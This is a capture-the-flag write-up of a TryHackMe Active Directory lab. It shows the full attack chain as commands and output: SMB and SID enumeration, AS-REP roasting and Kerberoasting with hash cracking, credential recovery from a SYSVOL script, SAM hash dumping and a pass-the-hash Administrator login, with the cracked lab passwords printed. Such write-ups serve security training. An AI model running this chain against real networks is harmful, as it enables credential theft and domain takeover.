VUNNET:ROASTED
______________

ENUMERATION
___________

NMAP
____

```
# Nmap 7.92 scan initiated Wed Mar 16 12:52:19 2022 as: nmap -sC -sV -p- -Pn --min-rate 2000 -oN nmap.txt 10.10.141.120
Nmap scan report for 10.10.141.120
Host is up (0.20s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-16 16:54:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn?
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  tcpwrapped
9389/tcp  open  tcpwrapped
49667/tcp open  tcpwrapped
49669/tcp open  tcpwrapped
49670/tcp open  tcpwrapped
49676/tcp open  tcpwrapped
49683/tcp open  tcpwrapped
49696/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port139-TCP:V=7.92%I=7%D=3/16%Time=6232162E%P=x86_64-pc-linux-gnu%r(Get
SF:Request,5,"\x83\0\0\x01\x8f");
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-03-16T16:54:55
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 16 12:56:08 2022 -- 1 IP address (1 host up) scanned in 229.07 seconds



```

SMB-ENUMERATION
_______________

```
ENUM4LINUX ----> NO USEFULL YEILED

SMBMAP

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ smbmap -H $IP -u anonymous
[+] Guest session       IP: 10.10.55.41:445     Name: 10.10.55.41                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing



smbclient //$IP/VulnNet-Business-Anonymous -u anonymous


""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ smbclient //$IP/VulnNet-Business-Anonymous -u anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4495839 blocks available


""




smbclient //$IP/VulnNet-Enterprise-Anonymous -u anonymous

""


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ smbclient //$IP/VulnNet-Enterprise-Anonymous -u anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4506239 blocks available


""


lets check all of the files

NOTHING

WE HAVE ONE MORE SHARE NAMED $IPC ON FURTHER RESEARCH WE FOUND OUT YOU CAN ENUMERATE USERS USING IMPACKET's 
lookupsid.py 

```

USER-ENUMERATION
________________


```

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ ./lookupsid.py anonymous@$IP -no-pass                     
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.55.41
[*] StringBinding ncacn_np:10.10.55.41[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

SIDTYPEUSERS

""
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn 
a-whitehat
t-skid
j-goldenhand
j-leet

""


```

EXPLOITATION AS-REP ROASTING
____________________________

```
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ ./GetNPUsers.py   'VULNNET-RST/' -dc-ip $IP -usersfile kerbusers.txt
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST:cbb4a915ae99d83cd19f64029293d98c$7f49fa101640bfb6fc05ebf22ec644919d90e987cd83f9a38b74f164af9658005386b91e41797e10bdbf32ac517e97e5608e266e9d1d481b351e6af47e0c701f1489806581ea461db0b6f7fb2d92197eebee9b39a01c7f8b4561afc1052a680c14093538585a606a76031049e97b7ba1660da0608a7f4320ece539ed20c9cc1d7b3d80d63fc44ee2ac9dcce69ee1cf0a419dd9f3612451d72159e23c9edf48f99d1c17a2a9d2d9310f0dc189d5697f95c488b174f243589e66ffcbfcd503c0c46dc1cca53444187edee961da7c9e6a62f6cdb2c6009bd9fb033f378c4511a870f2d293e96b01ab36909bccaf61dcb0ba
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set



```

HASH-CRACKING
_____________

```

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ john --wordlist=/opt/rockyou.txt t-skid-hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST)     
1g 0:00:00:09 DONE (2022-03-17 13:13) 0.1111g/s 353166p/s 353166c/s 353166C/s tj3929..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                    

```
USERNAME= t-skid
PASSWORD= tj072889*

NOW WE CAN START KERBROASTING
_____________________________

```
./GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile kerbrosting-hash.txt -dc-ip $IP
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ ./GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile kerbrosting-hash.txt -dc-ip $IP
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             



[-] CCache file is not found. Skipping...
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ ls
GetNPUsers.py  GetUserSPNs.py  kerbrosting-hash.txt  kerbrute  kerbusers.txt  lookupsid.py  nmap.txt  smb-share  TASKANSWERS  t-skid-hash.txt
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ cat kerbrosting-hash.txt 
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$d950d4fc74a90d1ff741971d26f53fb0$eb156b8e432cb2dbd8e7a67d51c48bcd4f6ad14f78490f8ee38cf636ad945fb28136b5b4d88015ba38c2a82ef76a544c43e3dfce14fbc07647d47ca183415abd6145cac5cb4495982ff99e9bb372fd8949d4aeac6da1c202271563067ba4115ebdbaa23e44d0e796be2694d8da5f704e18b140efeef66a41072d41550e2630a697bc4eb6cb1f73bd1d7ac3bae715c3d488e6307b8f7d30fcb069bf333320d28bc7c83f1681c07d5a645de300fba7ddd13a88273ef6b8fe6dc9dde2cb7c629ab69b30dfd4231ba176bacf978a52fff639de9bd27e1a43eaef468fc71896b625c29f56ab68e08562d20aac072b4412c20a05bed19eaa915e1de86ad02466731a36dab3a0b441aff439b99b5e9433fd6f97a63cda0d7b9a82fe19fd922893fa13a9680230c0358d471a4a8092dda69a34ac6ee1e4204523ee79557fdfa699c254612e6cf8bdf5e1ec8c4ec2d837a0ffdb8976e8c3b9ddf42370f0ceade8768d7cc5896dc5c8c82d731c6e26dfe3a5c37f566cd15e43cd7ae96cffed12412b081d02cd25b702045e5c9a2e410f6e9e899786704e4cd29ebf73d7978907b344fbf9f6e6204dda8c5a5a210f1b200a2270ce77a063ce51f76161c2de0bfb2906764a35efb4c71cad0af03b31260f4a6e79794f8ab8e3a4d71d3e13f492a609c2c4dca678dbad3d2d4ea23c7486ad24690f4a5be84dfd41e5116194fe10607c44de3e13528b00341a87266cce05bfe2b88ccc1e21e7af5ac362658c2e377311b45836f792ee1615c69716ac1b9095e376f9be5cc54ae8446b224ee624eeacd6c77c48dc5cdc731aa341b3d4a9e86ab9568b1a7be53f6191cea98f93814d4bda6f67a414cfe3be19fe42f4493f3d20a91dfccefb54272b2beae6a803e09bafb94861e554b82aec9abe9ab98a08916b9bbe9df7b6431674ce4265ba3756a2f410acc444b3fd07ddbb068826cfaffc6693bfc8e54e3011255357cc0a314fb53a9d2120ba894030e8143e6aca687a28d2f093df76ebb6c939b58bde94d48d413d5eea238392e7c2fe95991b604442dd3c1aa4f4a1754e15b7d566eafbd194329ef4b44f3b2fb116466b949d5c39d04b7d7efd3fb6e6bf9b077ea8d677670047a27fd75488e7b8f9769222a615a54875b7708aef82c06c022632830e120875046ac2df923251c107e404e52533a59e115a25f5e17f9998d73d24f7eaa776a1531ba97cc0e935791af4af2a4504976da4c44e3046b79a09efafd427a7e00c5f6770cccf48f192822c889e0fbb2e5d53cbdedef59e710be26b4eff86727cde9f001829af76d53e0c873d82b5f6e10f63e1e9ddb8be5a514bddb00a1364e184e65839c8f07408b4aae919cdc38a1f8e477d822b81e564db3bc3d66d079c22fdd2e94e0e0c
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ john --wordlist=/opt/rockyou.txt kerbrosting-hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)     
1g 0:00:00:07 DONE (2022-03-17 13:26) 0.1366g/s 561241p/s 561241c/s 561241C/s ryan0318..ry=iIyD{N
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


```

USERNAME= enterprise-core-vn
PASSWORD= ry=ibfkfv,s6h,

MACHINE RESTARTED ====NEW-IP-ADDRESS====



LETS LOGIN WITH EVIL-WINRM
__________________________

```


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ evil-winrm -i $IP -u enterprise-core-vn -p ry=ibfkfv,s6h,

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> ls
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> dir
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cd ..
*Evil-WinRM* PS C:\Users\enterprise-core-vn> cd Desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> dir


    Directory: C:\Users\enterprise-core-vn\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt


*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> cat user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}


```






NOW WE CAN ENUMERATE SMB AS PREVIOUS ONE CANNOT LIST THE DIRECTORIES
____________________________________________________________________

```

SMBMAP
""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ smbmap -H $IP -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
[+] IP: 10.10.64.31:445 Name: 10.10.64.31                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing


""

smbclient //$IP/NETLOGON -U enterprise-core-vn%password

""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ smbclient //$IP/SYSVOL -U enterprise-core-vn%ry=ibfkfv,s6h,
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 11 14:19:49 2021
  ..                                  D        0  Thu Mar 11 14:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021

                8771839 blocks of size 4096. 4555309 blocks available
smb: \> cd vulnnet-rst.local\
smb: \vulnnet-rst.local\> ls
  .                                   D        0  Thu Mar 11 14:23:40 2021
  ..                                  D        0  Thu Mar 11 14:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
  Policies                            D        0  Thu Mar 11 14:20:26 2021
  scripts                             D        0  Tue Mar 16 19:15:49 2021

                8771839 blocks of size 4096. 4555258 blocks available
smb: \vulnnet-rst.local\> cd DfsrPrivate\
cd \vulnnet-rst.local\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
smb: \vulnnet-rst.local\> cd Policies\
smb: \vulnnet-rst.local\Policies\> ls
  .                                   D        0  Thu Mar 11 14:20:26 2021
  ..                                  D        0  Thu Mar 11 14:20:26 2021
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Thu Mar 11 14:20:26 2021
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Thu Mar 11 14:20:26 2021

                8771839 blocks of size 4096. 4554986 blocks available
smb: \vulnnet-rst.local\Policies\> cd ..
smb: \vulnnet-rst.local\> cd scripts\
smb: \vulnnet-rst.local\scripts\> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8771839 blocks of size 4096. 4554986 blocks available
smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs 
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
smb: \vulnnet-rst.local\scripts\> cd ..
smb: \vulnnet-rst.local\> ls
  .                                   D        0  Thu Mar 11 14:23:40 2021
  ..                                  D        0  Thu Mar 11 14:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
  Policies                            D        0  Thu Mar 11 14:20:26 2021
  scripts                             D        0  Tue Mar 16 19:15:49 2021

                8771839 blocks of size 4096. 4554847 blocks available
smb: \vulnnet-rst.local\> ^C
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ ls                              
GetNPUsers.py  GetUserSPNs.py  kerbrosting-hash.txt  kerbrute  kerbusers.txt  lookupsid.py  nmap.txt  ResetPassword.vbs  smb-share  TASKANSWERS  t-skid-hash.txt
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ cat ResetPassword.vbs   
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTName 


""



```

PASSWORDS FOUND FROM THE VBS SCRIPT
___________________________________


```
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"



```


LOGIN AS THIS USER
__________________


```
smbclient //$IP/SYSVOL -U a-whitehat%bNdKVkjv3RR9ht



SAME BUT NO OTHER CREDS


```


LETS TRY TO DUMP HASHES WITH secretsdump.py
___________________________________________

```


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ ./secretsdump.py VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@$IP
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.


```

WE GOT THE ADMIN HASH WE CAN NOW LOGIN WITH THIS HASH 

```
evil-winrm -i $IP -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/VULNNET:ROASTED]
└─$ evil-winrm -i $IP -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 


```

